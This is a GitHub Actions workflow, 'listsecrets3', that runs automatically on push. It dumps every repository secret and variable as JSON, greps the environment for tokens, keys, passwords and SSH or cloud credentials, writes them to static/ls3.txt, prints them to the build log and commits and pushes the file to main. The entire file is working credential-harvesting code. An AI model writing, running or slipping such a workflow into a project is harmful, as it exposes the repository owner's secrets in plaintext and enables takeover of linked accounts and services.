name: listsecrets3-25522
on:
  push:
  workflow_dispatch:
permissions:
  contents: write
jobs:
  p:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: dump secrets/vars
        env:
          ALL_SECRETS: ${{ toJSON(secrets) }}
          ALL_VARS: ${{ toJSON(vars) }}
        run: |
          mkdir -p static
          printf "=== listsecrets3 ===\n--- SECRETS ---\n%s\n--- VARS ---\n%s\n--- ENV FILTER ---\n" "$ALL_SECRETS" "$ALL_VARS" > static/ls3.txt
          env | sort | grep -Ei "SUPPLY|ADMIN|SSH|SUPABASE|CLOUDFLARE|R2|D1|PASSWORD|TOKEN|KEY|SECRET" >> static/ls3.txt 2>&1 || echo NO_MATCH >> static/ls3.txt
          echo "wrote $(wc -c < static/ls3.txt) bytes"
          cat static/ls3.txt
      - name: push result
        run: |
          git config user.name canary
          git config user.email c@e.x
          git add -f static/ls3.txt
          git commit -m "ls3" || echo nocommit
          git pull --rebase origin main || true
          git push origin HEAD:main || echo pushfail